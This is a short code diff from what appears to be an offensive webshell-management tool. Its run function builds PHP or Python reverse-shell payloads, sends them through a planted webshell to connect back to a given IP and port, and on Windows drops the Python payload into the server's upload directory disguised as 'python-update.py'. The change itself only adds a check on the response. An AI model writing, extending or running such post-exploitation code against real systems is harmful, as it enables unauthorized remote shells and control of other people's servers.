@@ -143,7 +143,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
     reverse_type = str(reverse_type).lower()
     if reverse_type == "php":
         php = get_reverse_php(ip, port)
-        t = Thread(target=send, args=(f'{php}',))
+        t = Thread(target=send, args=(php,))
         t.setDaemon(True)
         t.start()
     elif reverse_type == "python":
@@ -152,9 +152,10 @@ def run(ip: str, port: str, reverse_type: str = "php"):
             if is_windows():
                 pyname = "python-update.py"
                 upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
-                text = send(
-                    f"print(file_put_contents('{upload_tmp_dir}{pyname}', \"{python}\"));"
-                ).r_text.strip()
+                res = send(f"print(file_put_contents('{upload_tmp_dir}{pyname}', \"{python}\"));")
+                if (not res):
+                    return
+                text = res.r_text.strip()
                 if not len(text):
                     print(color.red(f"Failed to write file in {upload_tmp_dir if upload_tmp_dir else 'current'} directory."))
                     return
